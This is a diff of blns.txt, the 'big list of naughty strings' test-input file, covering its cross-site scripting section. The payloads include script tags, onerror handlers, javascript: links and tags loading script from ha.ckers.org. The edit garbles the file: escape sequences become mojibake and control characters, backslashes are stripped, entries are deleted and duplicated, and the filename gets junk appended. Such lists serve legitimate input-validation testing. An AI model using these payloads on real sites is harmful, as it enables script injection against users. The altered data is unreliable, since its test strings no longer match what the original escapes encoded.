@@ -15,7 +15,7 @@ big-list-of-naughty-strings
 810
 35k1.5k
  Code Issues 44 Pull requests 17 Actions Projects 0 Wiki Security Insights
-big-list-of-naughty-strings/blns.txt
+big-list-of-naughty-strings/blns.txtghghhj
 @minimaxir minimaxir Merge branch 'master' into master
 2f3806e on Dec 1, 2019
 @minimaxir@jlennox@Plazmaz@zackw@Towerful@stuartpb@benpious@06b@netlovers@Maykeye@eedrah@greenjoe@charmander@Xe@topaz@pgrochowski@Miha-x64@sartak@romuald@RomainGehrig@rschoultz-wl@patch@radare@mikesamuel@joshuaduffy@lifengdvnera
@@ -42,8 +42,6 @@ None
 hasOwnProperty
 then
 constructor
-\
-\\
 
 #	Numeric Strings
 #
@@ -126,7 +124,7 @@ INF
 # ASCII punctuation.  All of these characters may need to be escaped in some
 # contexts.  Divided into three groups based on (US-layout) keyboard position.
 
-,./;'[]\-=
+,./;'[]-=
 <>?:"{}|_+
 !@#$%^&*()`~
 
@@ -269,7 +267,7 @@ __ﾛ(,_,*)
 (ﾉಥ益ಥ）ﾉ﻿ ┻━┻
 ┬─┬ノ( º _ ºノ)
 ( ͡° ͜ʖ ͡°)
-¯\_(ツ)_/¯
+¯_(ツ)_/¯
 
 #	Emoji
 #
@@ -389,180 +387,193 @@ src=JaVaSCript:prompt(132)
 ><script>alert(123);</script x=
 " autofocus onkeyup="javascript:alert(123)
 ' autofocus onkeyup='javascript:alert(123)
-<script\x20type="text/javascript">javascript:alert(1);</script>
-<script\x3Etype="text/javascript">javascript:alert(1);</script>
-<script\x0Dtype="text/javascript">javascript:alert(1);</script>
-<script\x09type="text/javascript">javascript:alert(1);</script>
-<script\x0Ctype="text/javascript">javascript:alert(1);</script>
-<script\x2Ftype="text/javascript">javascript:alert(1);</script>
-<script\x0Atype="text/javascript">javascript:alert(1);</script>
-'`"><\x3Cscript>javascript:alert(1)</script>
-'`"><\x00script>javascript:alert(1)</script>
-ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
-ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
-ABC<div style="x:expression\x00(javascript:alert(1)">DEF
-ABC<div style="x:exp\x00ression(javascript:alert(1)">DEF
-ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF
-ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
-ABC<div style="x:\x09expression(javascript:alert(1)">DEF
-ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
-ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1)">DEF
-ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
-ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1)">DEF
-ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)">DEF
-ABC<div style="x:\x0Dexpression(javascript:alert(1)">DEF
-ABC<div style="x:\x0Cexpression(javascript:alert(1)">DEF
-ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF
-ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF
-ABC<div style="x:\x20expression(javascript:alert(1)">DEF
-ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1)">DEF
-ABC<div style="x:\x00expression(javascript:alert(1)">DEF
-ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)">DEF
-ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1)">DEF
-ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF
-ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1)">DEF
-ABC<div style="x:\x0Bexpression(javascript:alert(1)">DEF
-ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF
-ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1)">DEF
-ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
-<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
-`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
-`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
-`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
-`"'><img src=xxx:x \x0Donerror=javascript:alert(1)>
-`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
-`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
-`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
-`"'><img src=xxx:x \x00onerror=javascript:alert(1)>
-`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
-`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
-"`'><script>\x3Bjavascript:alert(1)</script>
-"`'><script>\x0Djavascript:alert(1)</script>
-"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
-"`'><script>\xE2\x80\x81javascript:alert(1)</script>
-"`'><script>\xE2\x80\x84javascript:alert(1)</script>
-"`'><script>\xE3\x80\x80javascript:alert(1)</script>
-"`'><script>\x09javascript:alert(1)</script>
-"`'><script>\xE2\x80\x89javascript:alert(1)</script>
-"`'><script>\xE2\x80\x85javascript:alert(1)</script>
-"`'><script>\xE2\x80\x88javascript:alert(1)</script>
-"`'><script>\x00javascript:alert(1)</script>
-"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
-"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
-"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
-"`'><script>\x0Cjavascript:alert(1)</script>
-"`'><script>\x2Bjavascript:alert(1)</script>
-"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
+<script type="text/javascript">javascript:alert(1);</script>
+<script>type="text/javascript">javascript:alert(1);</script>
+<script
+type="text/javascript">javascript:alert(1);</script>
+<script	type="text/javascript">javascript:alert(1);</script>
+<scripttype="text/javascript">javascript:alert(1);</script>
+<script/type="text/javascript">javascript:alert(1);</script>
+<script
+type="text/javascript">javascript:alert(1);</script>
+'`"><<script>javascript:alert(1)</script>
+'`">< script>javascript:alert(1)</script>
+ABC<div style="x:expression(javascript:alert(1)">DEF
+ABC<div style="x:expression(javascript:alert(1)">DEF
+ABC<div style="x:expression (javascript:alert(1)">DEF
+ABC<div style="x:exp ression(javascript:alert(1)">DEF
+ABC<div style="x:exp
+ession(javascript:alert(1)">DEF
+ABC<div style="x:
+expression(javascript:alert(1)">DEF
+ABC<div style="x:	expression(javascript:alert(1)">DEF
+ABC<div style="x:ãexpression(javascript:alert(1)">DEF
+ABC<div style="x:âexpression(javascript:alert(1)">DEF
+ABC<div style="x:Â expression(javascript:alert(1)">DEF
+ABC<div style="x:âexpression(javascript:alert(1)">DEF
+ABC<div style="x:âexpression(javascript:alert(1)">DEF
+ABC<div style="x:
+expression(javascript:alert(1)">DEF
+ABC<div style="x:expression(javascript:alert(1)">DEF
+ABC<div style="x:âexpression(javascript:alert(1)">DEF
+ABC<div style="x:ï»¿expression(javascript:alert(1)">DEF
+ABC<div style="x: expression(javascript:alert(1)">DEF
+ABC<div style="x:âexpression(javascript:alert(1)">DEF
+ABC<div style="x: expression(javascript:alert(1)">DEF
+ABC<div style="x:âexpression(javascript:alert(1)">DEF
+ABC<div style="x:âexpression(javascript:alert(1)">DEF
+ABC<div style="x:âexpression(javascript:alert(1)">DEF
+ABC<div style="x:âexpression(javascript:alert(1)">DEF
+ABC<div style="x:expression(javascript:alert(1)">DEF
+ABC<div style="x:âexpression(javascript:alert(1)">DEF
+ABC<div style="x:âexpression(javascript:alert(1)">DEF
+ABC<div style="x:âexpression(javascript:alert(1)">DEF
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="Â javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="á javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href=" javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href=" javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="	javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="â¯javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="ájavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="ãjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="
+javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="
+javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="â¨javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="â©javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript :javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript::javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript	:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript
+:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript
+:javascript:alert(1)" id="fuzzelement1">test</a>
+`"'><img src=xxx:x 
+onerror=javascript:alert(1)>
+`"'><img src=xxx:x "onerror=javascript:alert(1)>
+`"'><img src=xxx:x onerror=javascript:alert(1)>
+`"'><img src=xxx:x 
+onerror=javascript:alert(1)>
+`"'><img src=xxx:x /onerror=javascript:alert(1)>
+`"'><img src=xxx:x 	onerror=javascript:alert(1)>
+`"'><img src=xxx:x onerror=javascript:alert(1)>
+`"'><img src=xxx:x  onerror=javascript:alert(1)>
+`"'><img src=xxx:x 'onerror=javascript:alert(1)>
+`"'><img src=xxx:x  onerror=javascript:alert(1)>
+"`'><script>;javascript:alert(1)</script>
+"`'><script>
+javascript:alert(1)</script>
+"`'><script>ï»¿javascript:alert(1)</script>
+"`'><script>âjavascript:alert(1)</script>
+"`'><script>âjavascript:alert(1)</script>
+"`'><script>ãjavascript:alert(1)</script>
+"`'><script>	javascript:alert(1)</script>
+"`'><script>âjavascript:alert(1)</script>
+"`'><script>âjavascript:alert(1)</script>
+"`'><script>âjavascript:alert(1)</script>
+"`'><script> javascript:alert(1)</script>
+"`'><script>â¨javascript:alert(1)</script>
+"`'><script>âjavascript:alert(1)</script>
+"`'><script>ájavascript:alert(1)</script>
+"`'><script>javascript:alert(1)</script>
+"`'><script>+javascript:alert(1)</script>
+"`'><script>ðjavascript:alert(1)</script>
 "`'><script>-javascript:alert(1)</script>
-"`'><script>\x0Ajavascript:alert(1)</script>
-"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
-"`'><script>\x7Ejavascript:alert(1)</script>
-"`'><script>\xE2\x80\x87javascript:alert(1)</script>
-"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
-"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
-"`'><script>\xC2\x85javascript:alert(1)</script>
-"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
-"`'><script>\xE2\x80\x83javascript:alert(1)</script>
-"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
-"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
-"`'><script>\xE2\x80\x80javascript:alert(1)</script>
-"`'><script>\x21javascript:alert(1)</script>
-"`'><script>\xE2\x80\x82javascript:alert(1)</script>
-"`'><script>\xE2\x80\x86javascript:alert(1)</script>
-"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
-"`'><script>\x0Bjavascript:alert(1)</script>
-"`'><script>\x20javascript:alert(1)</script>
-"`'><script>\xC2\xA0javascript:alert(1)</script>
-<img \x00src=x onerror="alert(1)">
-<img \x47src=x onerror="javascript:alert(1)">
-<img \x11src=x onerror="javascript:alert(1)">
-<img \x12src=x onerror="javascript:alert(1)">
-<img\x47src=x onerror="javascript:alert(1)">
-<img\x10src=x onerror="javascript:alert(1)">
-<img\x13src=x onerror="javascript:alert(1)">
-<img\x32src=x onerror="javascript:alert(1)">
-<img\x47src=x onerror="javascript:alert(1)">
-<img\x11src=x onerror="javascript:alert(1)">
-<img \x47src=x onerror="javascript:alert(1)">
-<img \x34src=x onerror="javascript:alert(1)">
-<img \x39src=x onerror="javascript:alert(1)">
-<img \x00src=x onerror="javascript:alert(1)">
-<img src\x09=x onerror="javascript:alert(1)">
-<img src\x10=x onerror="javascript:alert(1)">
-<img src\x13=x onerror="javascript:alert(1)">
-<img src\x32=x onerror="javascript:alert(1)">
-<img src\x12=x onerror="javascript:alert(1)">
-<img src\x11=x onerror="javascript:alert(1)">
-<img src\x00=x onerror="javascript:alert(1)">
-<img src\x47=x onerror="javascript:alert(1)">
-<img src=x\x09onerror="javascript:alert(1)">
-<img src=x\x10onerror="javascript:alert(1)">
-<img src=x\x11onerror="javascript:alert(1)">
-<img src=x\x12onerror="javascript:alert(1)">
-<img src=x\x13onerror="javascript:alert(1)">
+"`'><script>
+javascript:alert(1)</script>
+"`'><script>â¯javascript:alert(1)</script>
+"`'><script>~javascript:alert(1)</script>
+"`'><script>âjavascript:alert(1)</script>
+"`'><script>âjavascript:alert(1)</script>
+"`'><script>â©javascript:alert(1)</script>
+"`'><script>Âjavascript:alert(1)</script>
+"`'><script>ï¿®javascript:alert(1)</script>
+"`'><script>âjavascript:alert(1)</script>
+"`'><script>âjavascript:alert(1)</script>
+"`'><script>ï¿¾javascript:alert(1)</script>
+"`'><script>âjavascript:alert(1)</script>
+"`'><script>!javascript:alert(1)</script>
+"`'><script>âjavascript:alert(1)</script>
+"`'><script>âjavascript:alert(1)</script>
+"`'><script>á javascript:alert(1)</script>
+"`'><script>javascript:alert(1)</script>
+"`'><script> javascript:alert(1)</script>
+"`'><script>Â javascript:alert(1)</script>
+<img  src=x onerror="alert(1)">
+<img Gsrc=x onerror="javascript:alert(1)">
+<img src=x onerror="javascript:alert(1)">
+<img src=x onerror="javascript:alert(1)">
+<imgGsrc=x onerror="javascript:alert(1)">
+<imgsrc=x onerror="javascript:alert(1)">
+<imgsrc=x onerror="javascript:alert(1)">
+<img2src=x onerror="javascript:alert(1)">
+<imgGsrc=x onerror="javascript:alert(1)">
+<imgsrc=x onerror="javascript:alert(1)">
+<img Gsrc=x onerror="javascript:alert(1)">
+<img 4src=x onerror="javascript:alert(1)">
+<img 9src=x onerror="javascript:alert(1)">
+<img  src=x onerror="javascript:alert(1)">
+<img src	=x onerror="javascript:alert(1)">
+<img src=x onerror="javascript:alert(1)">
+<img src=x onerror="javascript:alert(1)">
+<img src2=x onerror="javascript:alert(1)">
+<img src=x onerror="javascript:alert(1)">
+<img src=x onerror="javascript:alert(1)">
+<img src =x onerror="javascript:alert(1)">
+<img srcG=x onerror="javascript:alert(1)">
+<img src=x	onerror="javascript:alert(1)">
+<img src=xonerror="javascript:alert(1)">
+<img src=xonerror="javascript:alert(1)">
+<img src=xonerror="javascript:alert(1)">
+<img src=xonerror="javascript:alert(1)">
 <img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
-<img src=x onerror=\x09"javascript:alert(1)">
-<img src=x onerror=\x10"javascript:alert(1)">
-<img src=x onerror=\x11"javascript:alert(1)">
-<img src=x onerror=\x12"javascript:alert(1)">
-<img src=x onerror=\x32"javascript:alert(1)">
-<img src=x onerror=\x00"javascript:alert(1)">
+<img src=x onerror=	"javascript:alert(1)">
+<img src=x onerror="javascript:alert(1)">
+<img src=x onerror="javascript:alert(1)">
+<img src=x onerror="javascript:alert(1)">
+<img src=x onerror=2"javascript:alert(1)">
+<img src=x onerror= "javascript:alert(1)">
 <a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
 <img src="x` `<script>javascript:alert(1)</script>"` `>
 <img src onerror /" '"= alt=javascript:alert(1)//">
@@ -570,8 +581,8 @@ ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
 <a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
 <!--[if]><script>javascript:alert(1)</script -->
 <!--[if<img src=x onerror=javascript:alert(1)//]> -->
-<script src="/\%(jscript)s"></script>
-<script src="\\%(jscript)s"></script>
+<script src="/%(jscript)s"></script>
+<script src="%(jscript)s"></script>
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
 <IMG SRC=# onmouseover="alert('xxs')">
@@ -584,17 +595,17 @@ ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
 <IMG SRC="jav&#x09;ascript:alert('XSS');">
 <IMG SRC="jav&#x0A;ascript:alert('XSS');">
 <IMG SRC="jav&#x0D;ascript:alert('XSS');">
-perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+perl -e 'print "<IMG SRC=java script:alert("XSS")>";' > out
 <IMG SRC=" &#14;  javascript:alert('XSS');">
 <SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<BODY onload!#$%&()*~+-_.,:;?@[/|]^`=alert("XSS")>
 <SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <<SCRIPT>alert("XSS");//<</SCRIPT>
 <SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
 <SCRIPT SRC=//ha.ckers.org/.j>
 <IMG SRC="javascript:alert('XSS')"
 <iframe src=http://ha.ckers.org/scriptlet.html <
-\";alert('XSS');//
+";alert('XSS');//
 <u oncopy=alert()> Copy me</u>
 <i onwheel=alert(1)> Scroll over me </i>
 <plaintext>
